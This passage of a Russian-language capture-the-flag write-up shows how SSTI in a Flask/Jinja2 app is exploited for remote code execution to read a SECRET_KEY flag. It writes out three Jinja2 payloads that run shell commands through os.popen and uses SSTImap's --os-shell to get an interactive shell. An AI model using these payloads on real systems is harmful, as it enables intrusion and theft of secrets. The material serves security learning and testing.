<p>–û—Å—Ç–∞–ª–æ—Å—å –¥–µ–ª–æ –∑–∞ –º–∞–ª—ã–º: –ø–æ–¥–æ–±—Ä–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∏ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å –µ—ë.</p>
<h1><strong>–°–ø–æ—Å–æ–± 1. –ê–Ω–∞–ª–æ–≥–∏—á–Ω—ã–π –ø—Ä–∏–º–µ—Ä—É —Ö–æ–¥ —Ä–µ—à–µ–Ω–∏—è</strong></h1>
<p>–ù–∞—á–∏–Ω–∞–µ–º –ø–æ–¥–±–∏—Ä–∞—Ç—å –ø–æ–ª–µ–∑–Ω—É—é –Ω–∞–≥—Ä—É–∑–∫—É –∞–Ω–∞–ª–æ–≥–∏—á–Ω–æ —Ä–∞—Å—Å–º–æ—Ç—Ä–µ–Ω–Ω–æ–º—É –≤ —Ç–µ–æ—Ä–∏–∏ –ø—Ä–∏–º–µ—Ä—É:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/8c4b27d7d7d64e82bfe3f.png">
  <figcaption>–ù–∞—á–∞–ª–æ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/2b8aa4ca1ab30ab7eb583.png">
  <figcaption>–ü–æ–ª—É—á–µ–Ω–∏–µ —Å—É–±–∫–ª–∞—Å—Å–æ–≤</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/1799757431a693025fb69.png">
  <figcaption>–ü–æ–∏—Å–∫ –Ω—É–∂–Ω–æ–≥–æ —Å—É–±–∫–ª–∞—Å—Å–∞</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/2f5ac63b5fa662a8243cb.png">
  <figcaption>RCE!</figcaption>
</figure>
<p>–ú—ã –ø–æ–ª—É—á–∏–ª–∏ RCE! –í —ç—Ç–æ–º —Å–ª—É—á–∞–µ –∏—Å–∫–æ–º—ã–π —Å—É–±–∫–ª–∞—Å—Å –∏–º–µ–µ—Ç –∏–Ω–¥–µ–∫—Å 361. –ü–æ–º–µ—Å—Ç–∏–º –∑–∞–ø—Ä–æ—Å –≤ Repeater –∏ –Ω–∞—á–Ω—ë–º –∏—Å–∫–∞—Ç—å —Ñ–ª–∞–≥:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/8fae4bd30cc22a9bcd54b.png">
  <figcaption>–ó–∞–ø—Ä–æ—Å —Å –ø–æ–ª–µ–∑–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–æ–π, —Ä–µ–∑—É–ª—å—Ç–∞—Ç –∫–æ–º–∞–Ω–¥—ã id</figcaption>
</figure>
<p>–ú—ã –ø–æ–º–Ω–∏–º, —á—Ç–æ –∏—Å–∫–æ–º—ã–π —Ñ–ª–∞–≥ –Ω–∞—Ö–æ–¥–∏—Ç—Å—è –≤ –ø–µ—Ä–µ–º–µ–Ω–Ω–æ–π SECRET_KEY –≤ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è. –ü–æ—Å–º–æ—Ç—Ä–∏–º –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏—é, –∏–∑ –∫–æ—Ç–æ—Ä–æ–π –∑–∞–ø—É—â–µ–Ω–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏–µ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/f4e134028731104bc5d6d.png">
  <figcaption>–°–æ–¥–µ—Ä–∂–∏–º–æ–µ –¥–∏—Ä–µ–∫—Ç–æ—Ä–∏–∏ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è</figcaption>
</figure>
<p>–ú—ã –Ω–∞—Ö–æ–¥–∏–º 2 —Ñ–∞–π–ª–∞: app.py –∏ requirements.txt. –í—Ç–æ—Ä–æ–π —Ñ–∞–π–ª –Ω–∞—Å –Ω–µ –∏–Ω—Ç–µ—Ä–µ—Å—É–µ—Ç, —Ç–∞–∫ –∫–∞–∫ –ø—Ä–µ–¥—Å—Ç–∞–≤–ª—è–µ—Ç —Å–æ–±–æ–π –ª–∏—à—å –∑–∞–≤–∏—Å–∏–º–æ—Å—Ç–∏, –Ω–µ–æ–±—Ö–æ–¥–∏–º—ã–µ –¥–ª—è —Ä–∞–±–æ—Ç—ã –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∞ Flask, –∞ –ø–µ—Ä–≤—ã–π —Å–∫—Ä–∏–ø—Ç (app.py) —Å–æ–¥–µ—Ä–∂–∏—Ç –∏—Å—Ö–æ–¥–Ω—ã–π –∫–æ–¥ –Ω–∞—à–µ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è, –≤ —Ç–æ–º —á–∏—Å–ª–µ –∏ –∫–æ–Ω—Ñ–∏–≥—É—Ä–∞—Ü–∏–æ–Ω–Ω—ã–µ –ø–µ—Ä–µ–º–µ–Ω–Ω—ã–µ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/81d6697b1c530165f9ecc.png"></figure>
<p>–§–ª–∞–≥ –ø–æ–ª—É—á–µ–Ω!</p>
<p>–ò –æ—á–µ—Ä–µ–¥–Ω—ã–µ –±–∞–ª–ª—ã –≤ –∫–æ–ø–∏–ª–∫–µ :) –ù–∏–∂–µ —è –ø—Ä–µ–¥—Å—Ç–∞–≤–∏–ª –∫–æ–¥ —É—è–∑–≤–∏–º–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è –∏ –≤—ã–¥–µ–ª–∏–ª –º–µ—Å—Ç–æ, –∏–∑-–∑–∞ –∫–æ—Ç–æ—Ä–æ–≥–æ –º—ã —Å–º–æ–≥–ª–∏ –ø–æ–ª—É—á–∏—Ç—å RCE:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/0f4b724468230e49dbf52.png"></figure>
<p style="text-align:center;">–ö–æ–¥ —É—è–∑–≤–∏–º–æ–≥–æ –ø—Ä–∏–ª–æ–∂–µ–Ω–∏—è</p>
<h1><strong>–°–ø–æ—Å–æ–± 2. Payloads All The Things | HackTricks</strong></h1>
<p>–ù–∞ GitHub –µ—Å—Ç—å <a href="https://github.com/swisskyrepo/PayloadsAllTheThings">—Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π</a> –≤ –≤–∏–¥–µ —à–ø–∞—Ä–≥–∞–ª–∫–∏ –ø–æ –ø–æ–ª–µ–∑–Ω—ã–º –Ω–∞–≥—Ä—É–∑–∫–∞–º –¥–ª—è –≤—Å–µ—Ö –≤–µ–±-—É—è–∑–≤–∏–º–æ—Å—Ç–µ–π, –≤–∫–ª—é—á–∞—è <a href="https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/Server%20Side%20Template%20Injection">SSTI</a>. –î–∞–≤–∞–π—Ç–µ –∂–µ –≤–æ–∑—å–º—ë–º –æ—Ç—Ç—É–¥–∞ –Ω–∞–≥—Ä—É–∑–∫—É –∏ –ø–æ–ø—Ä–æ–±—É–µ–º –µ—ë:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/64f39f0a891d28e384bfc.png">
  <figcaption>–ù–∞—Ö–æ–¥–∏–º –Ω—É–∂–Ω—ã–π —Ä–∞–∑–¥–µ–ª</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/5bbfbd5136739a78b8bb7.png">
  <figcaption>–ü–æ–ª—É—á–∞–µ–º —Å–ø–∏—Å–æ–∫ –ø–æ–ª–µ–∑–Ω—ã—Ö –Ω–∞–≥—Ä—É–∑–æ–∫</figcaption>
</figure>
<p>–ü–æ–ø—Ä–æ–±—É–µ–º –ø–æ –æ–¥–Ω–æ–π –Ω–∞–≥—Ä—É–∑–∫–µ –∏–∑ –∫–∞–∂–¥–æ–≥–æ —Ä–∞–∑–¥–µ–ª–∞:</p>
<p style="text-align:center;"><code>{{ self.__init__.__globals__.__builtins__.__import__('os').popen('id').read() }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/f1112f18d394d535735aa.png">
  <figcaption>–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ #1</figcaption>
</figure>
<p style="text-align:center;"><code>{{ self._TemplateReference__context.cycler.__init__.__globals__.os.popen('id').read() }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/05b567ef653356c54d43b.png">
  <figcaption>–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ #2</figcaption>
</figure>
<p style="text-align:center;"><code>{{ cycler.__init__.__globals__.os.popen('id').read() }}</code></p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/89f79d9e816b5a9f2b2ce.png">
  <figcaption>–ü–æ–ª–µ–∑–Ω–∞—è –Ω–∞–≥—Ä—É–∑–∫–∞ #3</figcaption>
</figure>
<p>–ö–∞–∫ –º—ã –≤–∏–¥–∏–º, —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏—è —É—Å–ø–µ—à–Ω–∞, –∏ —Å –∑–∞–≥–æ—Ç–æ–≤–ª–µ–Ω–Ω—ã–º–∏ —Ä–∞–Ω–µ–µ –ø–æ–ª–µ–∑–Ω—ã–º–∏ –Ω–∞–≥—Ä—É–∑–∫–∞–º–∏ –¥–æ–±–∏—Ç—å—Å—è RCE –±—ã–ª–æ –µ—â—ë –ø—Ä–æ—â–µ!</p>
<h1><strong>–°–ø–æ—Å–æ–± 3. tplmap | sstimap</strong></h1>
<p>–î–ª—è –∞–≤—Ç–æ–º–∞—Ç–∏–∑–∞—Ü–∏–∏ –ø–æ–∏—Å–∫–∞ –∏ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ SSTI-—É—è–∑–≤–∏–º–æ—Å—Ç–∏ —É–º–Ω—ã–µ –ª—é–¥–∏ –Ω–∞–ø–∏—Å–∞–ª–∏ —Å–∫—Ä–∏–ø—Ç tplmap, –∫–æ—Ç–æ—Ä—ã–π –ø–æ —Å—É—Ç–∏ —Å–≤–æ–µ–π —Ä–∞–±–æ—Ç—ã –∏ –¥–∞–∂–µ –Ω–∞–∑–≤–∞–Ω–∏–µ–º –Ω–∞–ø–æ–º–∏–Ω–∞–µ—Ç sqlmap.</p>
<p>–°–∫–∞—á–∞—Ç—å –µ–≥–æ –º–æ–∂–Ω–æ –∏–∑ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è –Ω–∞ <a href="https://github.com/epinna/tplmap">GitHub</a>.</p>
<p>–ö —Å–æ–∂–∞–ª–µ–Ω–∏—é, –ø–æ–¥—Ä—É–∂–∏—Ç—å –µ–≥–æ —Å –º–æ–µ–π —Å–∏—Å—Ç–µ–º–æ–π –Ω–µ —É–¥–∞–ª–æ—Å—å, —Ç–∞–∫ —á—Ç–æ –µ–≥–æ –∏–∑—É—á–µ–Ω–∏–µ —è –æ—Å—Ç–∞–≤–ª—è—é –Ω–∞ –≤–∞—à–µ —É—Å–º–æ—Ç—Ä–µ–Ω–∏–µ :) –°–∫—Ä–∏–ø—Ç –ø–æ—Å–ª–µ–¥–Ω–∏–π —Ä–∞–∑ –æ–±–Ω–æ–≤–ª—è–ª—Å—è 5 –ª–µ—Ç –Ω–∞–∑–∞–¥ –∏ –∏—Å–ø–æ–ª—å–∑—É–µ—Ç "–ø–æ–ª–æ–º–∞–Ω–Ω—ã–µ" –±–∏–±–ª–∏–æ—Ç–µ–∫–∏, —Å —É—Å—Ç–∞–Ω–æ–≤–∫–æ–π –∫–æ—Ç–æ—Ä—ã—Ö –≤–æ–∑–Ω–∏–∫–∞—é—Ç –ø—Ä–æ–±–ª–µ–º—ã.</p>
<p>–ù–æ, –Ω–µ–º–Ω–æ–≥–æ –ø–æ–∏—Å–∫–∞–≤ –≤ –∏–Ω—Ç–µ—Ä–Ω–µ—Ç–µ, —è –Ω–∞—à–µ–ª —Ñ–æ—Ä–∫ –Ω–∞ —ç—Ç–æ—Ç —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏–π, –≤ –∫–æ—Ç–æ—Ä–æ–º <a href="https://github.com/vladko312">vladko312</a> –ø–µ—Ä–µ–ø–∏—Å–∞–ª —Å—Ç–∞—Ä—ã–π –∏–Ω—Å—Ç—Ä—É–º–µ–Ω—Ç, —Ä–∞—Å—à–∏—Ä–∏–≤ –µ–≥–æ —Ñ—É–Ω–∫—Ü–∏–æ–Ω–∞–ª. –ù–æ–≤–∞—è —Ç—É–ª–∑–∞ –Ω–∞–∑—ã–≤–∞–µ—Ç—Å—è SSTIMap (–µ—â—ë –±–æ–ª—å—à–µ –ø–æ—Ö–æ–∂–µ –Ω–∞ SQLMap), –∏ —Å–∫–∞—á–∞—Ç—å –µ—ë –º–æ–∂–Ω–æ <a href="https://github.com/vladko312/SSTImap">–æ—Ç—Å—é–¥–∞</a>.</p>
<p>–í –æ—Ç–ª–∏—á–∏–µ –æ—Ç tqlmap, —Å –Ω–µ–π –ø—Ä–æ–±–ª–µ–º –Ω–µ –≤–æ–∑–Ω–∏–∫–ª–æ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/0b61486d34f316a464ada.png">
  <figcaption>–ö–ª–æ–Ω–∏—Ä–æ–≤–∞–Ω–∏–µ —Ä–µ–ø–æ–∑–∏—Ç–æ—Ä–∏—è</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/dcddb0d4aa1975d5e2509.png">
  <figcaption>–ü–æ–ø—ã—Ç–∫–∞ —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ SSTI –Ω–∞ —É—è–∑–≤–∏–º–æ–º —Ä–µ—Å—É—Ä—Å–µ</figcaption>
</figure>
<p>–Ø —Å–Ω–∞—á–∞–ª–∞ –Ω–µ –Ω–∞—à–µ–ª, –∫–∞–∫–∏–º –æ–±—Ä–∞–∑–æ–º —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å —É—è–∑–≤–∏–º–æ—Å—Ç—å –≤ URL –±–µ–∑ –ø–∞—Ä–∞–º–µ—Ç—Ä–∞, –ø–æ—ç—Ç–æ–º—É –≤ –∏—Ç–æ–≥–µ —Å–∫—Ä–∏–ø—Ç –ø–æ–º–µ—á–∞–µ—Ç –ø–∞—Ä–∞–º–µ—Ç—Ä –∫–∞–∫ –Ω–µ—É—è–∑–≤–∏–º—ã–π:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/fab1298b4339f6e7dc61b.png">
  <figcaption>–¢–µ—Å—Ç–∏—Ä—É–µ–º—ã–µ –ø–∞—Ä–∞–º–µ—Ç—Ä—ã –Ω–µ—É—è–∑–≤–∏–º—ã :(</figcaption>
</figure>
<p>–û–¥–Ω–∞–∫–æ, –ø–æ—á–∏—Ç–∞–≤ --help (–≤—Å–µ–≥–¥–∞ —Å—Ç–æ–∏—Ç —á–∏—Ç–∞—Ç—å –º–∞–Ω—É–∞–ª—ã), —è –Ω–∞—à–µ–ª –ø–æ—Ö–æ–∂–µ –∏–Ω—Ç–µ—Ä–µ—Å—É—é—â–∏–π –º–µ–Ω—è –ø–∞—Ä–∞–º–µ—Ç—Ä:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/9ace7d0478b46374551a2.png">
  <figcaption>–ü–∞—Ä–∞–º–µ—Ç—Ä –º–∞—Ä–∫–µ—Ä–∞</figcaption>
</figure>
<p>–ü–æ–ø—Ä–æ–±—É–µ–º –≤—Å—Ç–∞–≤–∏—Ç—å –∑–≤—ë–∑–¥–æ—á–∫—É –ø–æ —É—è–∑–≤–∏–º–æ–º—É –ø—É—Ç–∏:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/d262ad770b7bf0e0a6183.png">
  <figcaption>–ó–∞–ø—É—Å–∫ —Å–∫—Ä–∏–ø—Ç–∞</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/37c14aced5074ca349519.png">
  <figcaption>–†–µ–∑—É–ª—å—Ç–∞—Ç!</figcaption>
</figure>
<p>–ù–∞ —ç—Ç–æ–º —ç—Ç–∞–ø–µ —è —Å–∏–ª—å–Ω–æ –æ–±—Ä–∞–¥–æ–≤–∞–ª—Å—è, —Ç–∞–∫ –∫–∞–∫ –ø–∞—Ä–∞–º–µ—Ç—Ä –¥–µ–π—Å—Ç–≤–∏—Ç–µ–ª—å–Ω–æ –ø–æ–∑–≤–æ–ª—è–µ—Ç –Ω–∞–º –¥–µ–ª–∞—Ç—å –º–Ω–æ–≥–æ–µ. –î–∞–≤–∞–π—Ç–µ –∂–µ –∑–∞–ø—É—Å—Ç–∏–º –µ–≥–æ —Å –ø–µ—Ä–µ–∫–ª—é—á–∞—Ç–µ–ª–µ–º --os-shell, —á—Ç–æ–±—ã –ø–æ–ª—É—á–∏—Ç—å –∏–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—É—é –æ–±–æ–ª–æ—á–∫—É –Ω–∞ —É—è–∑–≤–∏–º–æ–º —Å–µ—Ä–≤–µ—Ä–µ:</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/6249ee4357dd3b802baa0.png">
  <figcaption>–ü—ã—Ç–∞–µ–º—Å—è –ø–æ–ª—É—á–∏—Ç—å —à–µ–ª–ª</figcaption>
</figure>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/a9ef5dd31c48127b245db.png">
  <figcaption>–ò–Ω—Ç–µ—Ä–∞–∫—Ç–∏–≤–Ω—ã–π —à–µ–ª–ª</figcaption>
</figure>
<p>–ö—Å—Ç–∞—Ç–∏, —Å—É–¥—è –ø–æ –∏–º–µ–Ω–∏ —Ö–æ—Å—Ç–∞, –º—ã –Ω–∞—Ö–æ–¥–∏–º—Å—è –≤ –¥–æ–∫–µ—Ä–µ :)</p>
<p>–û—Å—Ç–∞–ª–æ—Å—å –ª–∏—à—å –ø–æ–ª—É—á–∏—Ç—å –∑–∞–≤–µ—Ç–Ω—ã–π –∫–ª—é—á, –∫–∞–∫ –º—ã –¥–µ–ª–∞–ª–∏ —Ä–∞–Ω–µ–µ.</p>
<figure class="image image_resized" style="width:732px;"><img src="https://telegra.ph/file/6fb835d6d4c3906f0b9f2.png">
  <figcaption>–ß—Ç–µ–Ω–∏–µ –∏—Å—Ö–æ–¥–Ω–∏–∫–æ–≤ –∏–∑ —à–µ–ª–ª–∞</figcaption>
</figure>
<p>–ü—Ä–∏–ª–æ–∂–µ–Ω–∏–µ –∏ —Ö–æ—Å—Ç —Å–∫–æ–º–ø—Ä–æ–º–µ—Ç–∏—Ä–æ–≤–∞–Ω—ã! –û—á–µ–≤–∏–¥–Ω–æ, —á—Ç–æ —Å–ø–æ—Å–æ–± —ç–∫—Å–ø–ª—É–∞—Ç–∞—Ü–∏–∏ —Å SSTIMap –Ω–∞–∏–±–æ–ª–µ–µ —É–¥–æ–±–µ–Ω –∏ –ø—Ä–æ—Å—Ç (–∫–∞–∫ "—Ä–∞—Å–∫—Ä—É—Ç–∫–∞" SQL-–∏–Ω—ä–µ–∫—Ü–∏–π —Å SQLMap), –æ–¥–Ω–∞–∫–æ —ç—Ç–æ—Ç –≤–∞—Ä–∏–∞–Ω—Ç –Ω–µ –≤—Å–µ–≥–¥–∞ –º–æ–∂–µ—Ç —Å—Ä–∞–±–æ—Ç–∞—Ç—å, –æ—Å–æ–±–µ–Ω–Ω–æ –µ—Å–ª–∏ —Ä–µ—á—å –∏–¥—ë—Ç –æ —Ñ–∏–ª—å—Ç—Ä–∞—Ö –∏ WAF. –ü–æ—ç—Ç–æ–º—É –ø–æ–Ω–∏–º–∞–Ω–∏–µ —Ä–∞–±–æ—Ç—ã —É—è–∑–≤–∏–º–æ—Å—Ç–∏ –∏ —É–º–µ–Ω–∏–µ —ç–∫—Å–ø–ª—É–∞—Ç–∏—Ä–æ–≤–∞—Ç—å –µ—ë –≤—Ä—É—á–Ω—É—é ‚Äî —Ü–µ–Ω–Ω—ã–π –Ω–∞–≤—ã–∫. –ê —Å–∫—Ä–∏–ø—Ç –∏–¥—ë—Ç –≤ –º–æ—é –∫–æ–ø–∏–ª–∫—É —Ç—É–ª–∑–æ–≤ –¥–ª—è –ø–µ–Ω—Ç–µ—Å—Ç–∞üëæ</p>
<p>&nbsp;</p>
